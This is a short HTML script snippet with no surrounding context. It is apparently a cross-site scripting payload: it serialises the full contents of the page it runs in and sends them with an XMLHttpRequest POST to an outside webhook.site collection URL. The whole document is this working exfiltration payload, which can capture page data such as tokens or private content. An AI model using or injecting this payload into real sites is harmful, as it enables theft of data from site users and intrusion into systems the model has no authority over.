<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://webhook.site/5d002a10-23f5-4946-a997-3cac4c81d807", true);
var text = new XMLSerializer().serializeToString(document);
xhr.send(JSON.stringify({
    "a": text
}));
</script>
